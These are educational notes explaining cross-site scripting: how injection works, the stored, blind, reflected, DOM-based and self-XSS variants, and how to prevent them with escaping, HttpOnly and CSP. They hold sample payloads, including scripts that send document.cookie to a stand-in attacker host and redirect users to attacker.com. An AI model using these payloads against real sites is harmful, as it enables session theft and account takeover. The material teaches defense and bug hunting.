An XXS vulnerability occurs when an attacker executes a custom script on the users browser. 
These attacks inject their code onto pages being viewed by other uses and can lead to things like leaking personal information, stealing cookies, changing site content, and or redirect the user to a malicious site. 
## Mechanisms
The attacker injects a script into webpages that users view, in order to understand XSS we first need to understand HTML and Javascript syntax.
Web pages are made up of HTML code that describe the pages structure and contents.

```html
<html>
	<h1>Welcome to my web page.</h1>
	<p>Thanks for visiting!</p>
</html>
```

HTML also allows us to embed images within pages, create user-input forms, link to external pages, and perform various other tasks.
It also allows us to execute scripts inside of HTML documents, its used to control client side application logic to create an interactive experience. 

```html
<html>
	<script>alert("Hello!");</script>
	<h1>Welcome to my web page.</h1>
	<p>Thanks for visiting!</p>
</html>
```

This script creates a pop-up message on the webpage that says `Hello!`.
This is called an `inline script` and are the cause for many XSS vulnerabilities. 

```html
<html>
	<script>alert("Hello!");</script>
	<h1>Welcome to my site.</h1>
	<h3>This is a cybersecurity newsletter that focuses on bug bounty news and write-ups. Please subscribe to my newsletter below to receive new cybersecurity articles in your email inbox.</h3>
	<form action"/subscribe" method="POST">
		<label for="email">Email:</label><br>
		<input type="text" id="email" value="Please enter your email.">
		<br><br>
		<input type="submit" value="Submit">
	</form>
</html>
```

This page contains a form that lets users subscribe to a newsletter.
After a users inputs their email the website confirms it by displaying it on the screen: 
```html
<p>Thanks! You have subscribed <b>example@gmail.com</b> to newsletter.</p>
```

What if the user decides to input a script instead of an email address? 

```html
<script>location="http://attacker.com";</script>
```

If the web application doesn't validate or sanitize the input before displaying the confirmation message the source code for the page would change.

```html
<p>Thanks! You have subscribed <b><script>location="http://attacker.com";</script></b> to newsletter.</p>
```

Validating user input means that the web app checks that the user input meets a certain standard. 
It should change special characters in the input that could be used as a means to interfere with our HTML logic. 
The example were seeing now would cause the user to be redirected to a malicious site.
XSS happens when attackers inject scripts in this way onto a page that another user is visiting. 

```html
<script src=http://attacker.com/xss.js></script>
```

Attackers can also manipulate the `src` attribute in HTML to load javascript files from external sources to execute in the users browser.
This example isn't really possible since there is no way to inject a script but they can redirect themselves to a malicious page. 

```html
http://subscribe.example.com?email=<script>location="http://attacker.com";</script>
```

However lets say the site also allows users to subscribe to the newsletter by visiting a URL, after they visit they will be subscribed, the confirmation will be shown on the users browser.
Attackers can inject a script that included in the link, the browser will think that the script is part of the actual website. 
The script could access resources stored on the browser like cookies and session tokens resulting in your information being stolen and possibly losing access to user accounts. 

```html
<script>image = new Image();
image.src='http://attacker_server_ip/?c='+document.cookie;</script>
```

This example of an XSS attack sends a request to the attack with the victims cookie as a URL parameter. 
## Types of XSS
There are 3 kinds of XSS attacks and the factor that differentiates them is how the payload travels before it gets delivered to the user. 
There are also a few XSS flaws that fall into their own special categories. 
#### Stored XSS
Occurs when the user input is stored on a server and retrieved unsafely.
The app doesn't validate user input, it stores it on its server and renderings it without being sanitized.
This is the most severe type of XSS attack, potential of attacking many or all users, only viewing the page is required to suffer this attack.
Attackers manage to permanently save their malicious code on the server for others to access.
We could see things like databases being affected, accessing server logs, etc.
For example a user can submit code in a comment field that could alter the page if the input isn't properly sanitized. 

```html
<script>alert('XSS by Drew')</script>
```

Submitting this code would be updated to look like this.

```html
<h2>Andrew's message</h2>
<p>What a great post! Thanks for sharing.</p>
<h2>Attacker's message</h2>
<p><script>alert('XSS by Drew')</script></p>
```

The comment field will display as blank but its running whatever code you type between the script tags, every time a user visits this page the malicious code will execute. 
Upon submitting it would become embedded on the forums pages HTML code.
#### Blind XSS
A blind XSS is a type of stored XSS vulnerability, the input is stored on the server and executed in another part of the app or is executed in a different app. 
For example a page that lets you send a message to support staff, the input is not sanitized and its rendered on the admin page. 
Harder to detect but just as dangerous as normal stored XSS, cant find them by looking for input reflected in the servers response. 
Used to attack administrators, extract their data, and take over their accounts. 
#### Reflected XSS
Occurs when the user input is returned to the user without being sent to the database, the data gets processed on the server side and returned to the user.
These issues happen when the server relies on user input to create pages that display search results or error messages. 
For example a user inputing a search term for a URL parameter, the page displays the term at the top of the results page. 

```html
<h2>You searched for abc; here are the results!</h2>
```

If the search displays user-submitted search strings on the result page search terms like the following would cause a code injection and would be executed in the victims browser upon visiting.
```html
https://example.com/search?q=<script>alert('XSS Attack')</script>
```

If an attacker can get a user to visit this URL the payload will be embedded on the page being viewed.
Victims browser executes whatever the attacker wants to do.
Reflected XSS allows attackers to execute code when users click their malicious link. 
#### DOM Based XSS
User input never leaves the browser, everything happens on the client side of the application, its all frontend. 
DOM (Document Object Model) is the model that the browser uses to render a web page, its how websites are structured. 
The attack goes after the local copy of the web page that exists in the victims browser, it avoids going through the server. 
The DOM can be attacked when the page takes in user data to dynamically alter the DOM based on that input, Javascript libraries like jQuery are prone to DOM based XSS attacks. 
Attackers send DOM based XSS payloads through the victims user input, it executes code that directly modifies the local source code. 

```php
https://example.com?locale=north+america
```

The pages client side code will use this locale to welcome the user.

```html
<h2>Welcome, user from north america!</h2>
```

The URL parameter isn't submitted to a server its used locally by the users browser to directly update the local DOM.
And the input isn't validated, attackers will use this to create malicious links.

```html
https://example.com?locale=<script>location='http://attacker_server_ip/?c='+document.cookie;</script>
```

This will embed the payload on the user's web page, the victims browser will execute the code.
These attacks happen when user input is rendered in an insecure manner. 
URL fragments are strings located at the end of a URL that begin with the `#` character, its used to automatically direct users to a specific section of the webpage or to transfer additional data. 

```php
https://example.com#about_us
```

This URL with a fragment takes the user to the `#about_us` section of the website they are visiting. 
#### Self XSS
This attack is based around tricking users into submitting inputs that are malicious payloads themselves.
For example, a field on a users dashboard is vulnerable to a stored XSS attack, since only the victim can see and edit it the attacker has to way to get at it. 
They would have to trick the user to changing the value into the XSS payload. 
Like a social media post telling you to paste a piece of code into your browser to get something cool, this was most likely aimed at tricking you into launching an XSS attack against yourself. 
Attackers embed a piece of malicious payload in the link and hid it using a URL shortener like `bit.ly`
This involves social engineering which is not usually a thing that is accepted as a valid submission in bug bounty programs. 
## Prevention
To prevent an XSS attack an application should implement two controls, Robust Input Validation and  Contextual Output Escaping And Encoding.
A server should validate that user submitted input does not contain any dangerous characters.
For example an input containing `<script>` tells us it contains an XSS payload. 
In this case the server could block the request or sanitize the input by removing or escaping the special characters before its processed. 
`Escaping` refers to the practice of encoding special characters so they end up interpreted literally instead of as special characters.
For example if the user input is inserted into `<script>` then we know it needs to be encoded in a Javascript format.
In `HMTL` the left and right brackets can be encoded as `&lt` and `&gt` to prevent XSS, the app should be escaping characters that have an important meaning in its specific format.
Escaping ensures that the browser wont misinterpret these characters as code to be executed.
This is what most modern applications do to prevent XSS.
The app should be doing this for every piece of user input that gets rendered or accessed by a users browser. 
To prevent DOM based XSS apps should avoid code that rewrites HTML document based on user input, needs to be a client side input validation mechanism before it touches the DOM.
Set the `HttpOnly` flag on sensitive cookies that your site uses to prevent them from being stolen and implement the `Content-Security-Policy` HTTP response header, allows you to restrict how resources such as Javascript load your web pages. 
## Hunting For XSS
Look for XSS in places where user input gets rendered, for different types of XSS the process will vary but the concept remains the same: check for reflected user input.

